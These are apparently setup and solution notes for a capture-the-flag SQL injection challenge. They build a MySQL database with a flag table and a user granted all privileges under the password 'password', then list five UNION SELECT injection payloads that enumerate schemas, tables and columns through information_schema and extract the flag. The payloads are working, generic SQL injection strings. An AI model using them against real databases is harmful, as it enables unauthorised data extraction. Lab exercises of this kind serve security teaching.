login to mysql with 
    mysql -u user -p

building the database
_____________________
CREATE database webapp;
USE webapp;
CREATE TABLE queue(userID VARCHAR(32) NOT NULL,queueNum INT(11),PRIMARY KEY(userID));
CREATE TABLE flag(flag VARCHAR(32) NOT NULL);
INSERT INTO flag VALUE("BIT{yayy_y0u_g0t_appl3_juic3}");
CREATE USER 'web'@'localhost';
GRANT ALL PRIVILEGES ON webapp.* To 'web'@'localhost' IDENTIFIED BY 'password';

exploiting 
__________
0'  UNION SELECT NULL,database() #
0'  UNION SELECT NULL,group_concat(schema_name) from information_schema.schemata #
0'  UNION SELECT NULL,group_concat(table_name) from information_schema.tables  where table_schema='webapp' #
0'  UNION SELECT NULL,group_concat(column_name) from information_schema.columns  where table_name='queue' #
0'  UNION SELECT NULL,group_concat(flag) from webapp.flag #
